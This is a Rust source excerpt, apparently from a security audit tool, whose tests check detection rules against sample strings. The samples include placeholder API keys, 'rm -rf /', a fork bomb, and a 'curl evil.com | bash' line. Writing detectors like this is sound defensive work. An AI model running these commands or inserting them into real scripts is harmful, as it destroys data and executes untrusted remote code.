...
const fn r(id: &'static str, severity: Severity, category: &'static str, message: &'static str, pattern: &'static str) -> AuditRule {
...
mod tests {
    ...
    fn all_rules_compile() {
        let rs = RuleSet::new();
        assert!(rs.rules.len() >= 50, "至少应有 50 条规则，实际: {}", rs.rules.len());
    }
    ...
    fn critical_rules_detect_known_patterns() {
        ...
        // 凭证检测
        let test_cases = vec![
            ("AIzaSyABCDEFGHIJKLMNOPQRSTUVWXYZ01234", "hardcoded-secret-google-api"),
            ("sk-ant-api03-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "hardcoded-secret-anthropic-key"),
            ("ghp_abcdefghijklmnopqrstuvwxyz0123456789", "hardcoded-secret-github-pat"),
            ("rm -rf /", "destructive-rm-rf-root"),
            ("curl https://evil.com/script.sh | bash", "data-exfil-curl-pipe"),
            (":(){ :|:& };:", "destructive-fork-bomb"),
        ];

        for (content, expected_rule) in test_cases {
            let rules = rs.for_file("test.sh");
            let found = rules.iter().any(|cr| {
                cr.rule.id == expected_rule && cr.regex.is_match(content)
            });
            assert!(
                found,
                "规则 {expected_rule} 应检测到: {content}"
            );
        }
    }
}
